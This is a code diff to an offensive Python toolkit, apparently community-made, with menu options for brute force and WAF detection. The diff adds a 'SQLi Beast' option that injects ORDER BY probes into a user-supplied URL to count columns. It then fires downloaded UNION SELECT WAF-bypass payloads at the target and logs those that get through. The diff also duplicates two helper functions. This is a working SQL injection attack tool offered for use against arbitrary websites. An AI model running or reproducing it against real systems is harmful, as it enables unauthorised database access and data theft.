@@ -626,6 +626,137 @@ def combo_attack():
     else:
         print(Fore.GREEN + f"[✓] Total found: {len(found)}" + Style.RESET_ALL)
 
+def download_wordlist(url, filename):
+    print(f"[+] Wordlist '{filename}' not found locally. Downloading from {url} ...")
+    try:
+        response = requests.get(url, timeout=20)
+        response.raise_for_status()
+        with open(filename, "w", encoding="utf-8") as f:
+            f.write(response.text)
+        print(f"[+] Downloaded and saved '{filename}' successfully.")
+        return True
+    except Exception as e:
+        print(f"[!] Failed to download wordlist: {e}")
+        return False
+
+def load_wordlist(file_path):
+    try:
+        with open(file_path, "r", encoding="utf-8") as f:
+            lines = [line.strip() for line in f if line.strip() != ""]
+        return lines
+    except Exception as e:
+        print(f"[!] Error loading wordlist '{file_path}': {e}")
+        return []
+
+def download_wordlist(url, filename):
+    if os.path.isfile(filename):
+        return True
+    print(f"[+] Downloading wordlist '{filename}' from {url} ...")
+    try:
+        r = requests.get(url, timeout=20)
+        r.raise_for_status()
+        with open(filename, "w", encoding="utf-8") as f:
+            f.write(r.text)
+        print(f"[+] Wordlist '{filename}' saved.")
+        return True
+    except Exception as e:
+        print(Fore.RED + f"[!] Failed to download {filename}: {e}" + Style.RESET_ALL)
+        return False
+
+def load_wordlist(filename):
+    try:
+        with open(filename, "r", encoding="utf-8") as f:
+            return [line.strip() for line in f if line.strip()]
+    except Exception as e:
+        print(Fore.RED + f"[!] Could not load wordlist '{filename}': {e}" + Style.RESET_ALL)
+        return []
+
+def sqli_beast_tool():
+    print(Fore.CYAN + "==== THBD SQLi Beast Tool ====" + Style.RESET_ALL)
+
+    target = input("Enter vulnerable URL with injectable param (e.g. http://site.com/page.php?id=): ").strip()
+    if not target:
+        print(Fore.RED + "[!] Target URL cannot be empty." + Style.RESET_ALL)
+        return
+
+    # Wordlists URLs
+    union_wordlist_url = "https://raw.githubusercontent.com/mrzico69/wordlists/main/unionselect_bypass_wordlist.txt"
+    orderby_wordlist_url = "https://raw.githubusercontent.com/mrzico69/wordlists/main/orderby_wordlist.txt"
+
+    union_wordlist_file = "unionselect_bypass_wordlist.txt"
+    orderby_wordlist_file = "orderby_wordlist.txt"
+
+    # Download wordlists if missing
+    if not download_wordlist(union_wordlist_url, union_wordlist_file):
+        print(Fore.RED + "[!] Cannot proceed without union select wordlist." + Style.RESET_ALL)
+        return
+    if not download_wordlist(orderby_wordlist_url, orderby_wordlist_file):
+        print(Fore.RED + "[!] Cannot proceed without orderby wordlist." + Style.RESET_ALL)
+        return
+
+    union_payloads = load_wordlist(union_wordlist_file)
+    orderby_payloads = load_wordlist(orderby_wordlist_file)
+
+    headers = {"User-Agent": "Mozilla/5.0 (compatible; THBD SQLi Beast)"}
+
+    print(Fore.YELLOW + "[*] Starting ORDER BY detection phase..." + Style.RESET_ALL)
+    max_columns = 50
+    detected_columns = 0
+
+    # Detect columns by sending ORDER BY payloads from wordlist or fallback to 1..max
+    for col_num in range(1, max_columns + 1):
+        payload = f" ORDER BY {col_num}--+"
+        test_url = target + payload
+        try:
+            resp = requests.get(test_url, headers=headers, timeout=15)
+            if resp.status_code >= 400:
+                detected_columns = col_num - 1
+                print(Fore.GREEN + f"[+] Detected max columns: {detected_columns}" + Style.RESET_ALL)
+                break
+        except Exception as e:
+            print(Fore.RED + f"[!] Request error during ORDER BY detection: {e}" + Style.RESET_ALL)
+            return
+
+    if detected_columns == 0:
+        detected_columns = max_columns
+        print(Fore.GREEN + f"[+] Assuming max columns: {detected_columns}" + Style.RESET_ALL)
+
+    # Build union select placeholder list for detected columns: '1,2,3,...'
+    union_columns = ",".join(str(i) for i in range(1, detected_columns + 1))
+
+    print(Fore.YELLOW + "[*] Starting UNION SELECT payload testing..." + Style.RESET_ALL)
+
+    found_payloads = []
+
+    for idx, payload_template in enumerate(union_payloads, start=1):
+        # Replace placeholder {union} with our columns
+        payload = payload_template.replace("{union}", union_columns)
+        test_url = target + payload
+
+        print(f"[{idx}/{len(union_payloads)}] Testing payload:\n{Fore.CYAN}{payload}{Style.RESET_ALL}")
+        try:
+            resp = requests.get(test_url, headers=headers, timeout=15)
+            if resp.status_code < 400:
+                print(Fore.GREEN + f"[+] Potential bypass detected with HTTP {resp.status_code}" + Style.RESET_ALL)
+                found_payloads.append(test_url)
+            else:
+                print(Fore.RED + f"[-] Blocked with HTTP {resp.status_code}" + Style.RESET_ALL)
+        except Exception as e:
+            print(Fore.RED + f"[!] Request error: {e}" + Style.RESET_ALL)
+        time.sleep(0.5)
+
+    if found_payloads:
+        print(Fore.CYAN + "\n[+] Bypass payloads that returned positive results:" + Style.RESET_ALL)
+        for p in found_payloads:
+            print(p)
+        with open("sqli_beast_success.txt", "a", encoding="utf-8") as f:
+            for p in found_payloads:
+                f.write(p + "\n")
+        print(Fore.GREEN + "[+] Saved successful payloads to sqli_beast_success.txt" + Style.RESET_ALL)
+    else:
+        print(Fore.RED + "[!] No working payload found." + Style.RESET_ALL)
+
+    print(Fore.CYAN + "[*] SQLi Beast finished." + Style.RESET_ALL)
 
 # =====================
 # === UPDATE FUNCTIONS ===
@@ -671,8 +802,9 @@ def main_menu():
         print("5. Wayback URL Extractor")
         print("6. WAF Detector")
         print("7. Login Page Brute Force")
-        print("8. Update Tool (program)")
-        print("9. Update Default Wordlists")
+        print("8. SQLi Bypass Wordlist Test")  # NEW OPTION inserted here
+        print("9. Update Tool (program)")      # OLD 8 shifted to 9
+        print("10. Update Default Wordlists")  # OLD 9 shifted to 10
         print("0. Exit")
 
         choice = input("\nYour choice: ").strip()
@@ -687,9 +819,7 @@ def main_menu():
             target = input("Enter target URL (e.g. example.com): ").strip()
             cms_detector(target)
         elif choice == "5":
-            domain = input(
-                "Enter domain for Wayback URL extraction (e.g. example.com): "
-            ).strip()
+            domain = input("Enter domain for Wayback URL extraction (e.g. example.com): ").strip()
             wayback_url_extractor(domain)
         elif choice == "6":
             target = input("Enter target URL (e.g. example.com): ").strip()
@@ -697,15 +827,16 @@ def main_menu():
         elif choice == "7":
             login_bruteforce()
         elif choice == "8":
-            update_tool()
+             sqli_beast_tool()  # call your new function here
         elif choice == "9":
+            update_tool()
+        elif choice == "10":
             update_wordlist()
         elif choice == "0":
             print(Fore.CYAN + "👋 Bye! Stay sharp, THBD Community 💻⚔️" + Style.RESET_ALL)
             break
         else:
             print(Fore.RED + "❌ Invalid option." + Style.RESET_ALL)
-
 
 # =====================
 # === ENTRY POINT ===
